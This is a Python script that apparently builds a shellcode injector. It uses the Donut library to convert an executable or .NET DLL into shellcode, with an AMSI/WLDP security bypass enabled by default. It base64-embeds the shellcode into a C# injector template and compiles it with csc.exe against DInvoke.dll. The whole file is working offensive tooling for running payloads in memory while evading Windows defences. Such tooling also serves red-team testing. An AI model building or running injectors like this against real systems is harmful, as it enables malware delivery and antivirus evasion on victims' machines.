import donut
import sys
import os
import ntpath
import random
import string
import argparse
from base64 import b64encode as b64e

# PARSE SCRIPT ARGUMENTS

def get_args():
    parser = argparse.ArgumentParser(description='Donut/Injector Program')
    parser.add_argument('-i', dest='filename', type=str, required=True, help='Input File')
    parser.add_argument('-a', dest='Arch', type=int, required=False, help='Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).')
    parser.add_argument('-o', dest='program', type=str, required=False, default='.\program.cs', help='Injector Code')
    parser.add_argument('-p', dest='Params', type=str, required=False, help='Optional parameters or command line, separated by comma or semi-colon.' )
    parser.add_argument('-n', dest='Namespace', type=str, required=False, help='Optional class name.class (required for .NET DLL)')
    parser.add_argument('-b', dest='Bypass', type=int, required=False, help='Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)')
    parser.add_argument('-m', dest='Method', type=str, required=False, help='Optional method or API name for DLL. (method is required for .NET DLL)')
    return parser.parse_args()

# PARSE FILENAME (TAKES FULL PATH AND CURRENT DIR)

if __name__ == '__main__':
    args = get_args()

print(f"[!] Generating shellcode from file")

files = [f for f in os.listdir('.') if os.path.isfile(f)]

def creador_de_donuts(filename,Params,Arch,Bypass):
    if filename not in files:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass))
        if sc is None:
                print(f"[-] Cannot find file. Ensure that file is either in current directory or full path is specified!")
                sys.exit(1)
    else:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass))
    return sc
               
def creador_de_donuts_dll(filename,Params,Arch,Bypass,Namespace,Method):
    if filename not in files:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass),cls=str(Namespace),method=str(Method))
        if sc is None:
                print(f"[-] Cannot find file. Ensure that file is either in current directory or full path is specified!")
                sys.exit(1)
    else:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass),cls=str(Namespace),method=str(Method))
    return sc

if not ".dll" in args.filename:
    if args.Params == None:
        args.Params = None
    if args.Bypass == None:
        args.Bypass = 3    
    if args.Arch == None:
        args.Arch = 3  
    sc = creador_de_donuts(args.filename,args.Params,args.Arch,args.Bypass)
   
if ".dll" in args.filename:
    if args.Params == None:
        args.Params = None
    if args.Bypass == None:
        args.Bypass = 3
    if args.Arch == None:
        args.Arch = 3  
    if args.Namespace == None: 
        print("You need to enter a Namespace and Class")
        exit(0)
    if args.Method == None:
        print("You need to enter a method :(")
        exit(0)
    sc = creador_de_donuts_dll(args.filename,args.Params,args.Arch,args.Bypass,args.Namespace,args.Method)

programs = [f for f in os.listdir('.') if os.path.isfile(f)]

if args.program not in programs:
    try:
        with open(args.program,'r') as myprogram:
            programcontent = myprogram.read()   
    except Exception as ex:
        print(f"\n[-] Cannot find file: {args.program}\n\
    Ensure that file is either in current directory or full path is specified!")
        sys.exit(1)
else:
    with open(args.program) as myprogram:
        programcontent = myprogram.read()

turtlecode = b64e(sc).decode()

def randomString(stringLength=10):
    up_letters = string.ascii_uppercase
    all_letters = string.ascii_letters
    return random.choice(up_letters) + \
            ''.join(random.choice(all_letters) for i in range(stringLength))

obf = programcontent.replace('base64_shellcode_goes_here', turtlecode)

head3,tail3 = ntpath.split(args.program)
obf_program = tail3.split('.')[0]+'_updated.cs'
obf_programpath = os.path.join(os.getcwd(),obf_program)
path_DInvoke = os.path.join(os.getcwd(),'DInvoke.dll')

with open(obf_programpath,'w') as myprogram:
        myprogram.write(obf)

print(f"\n[+] Compiled Program is in the current working directory called Program.exe")

compile = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /unsafe /nologo /out:program.exe /reference:" + f'"{path_DInvoke}" "{obf_programpath}"'
os.system(compile)
os.remove("Program_updated.cs")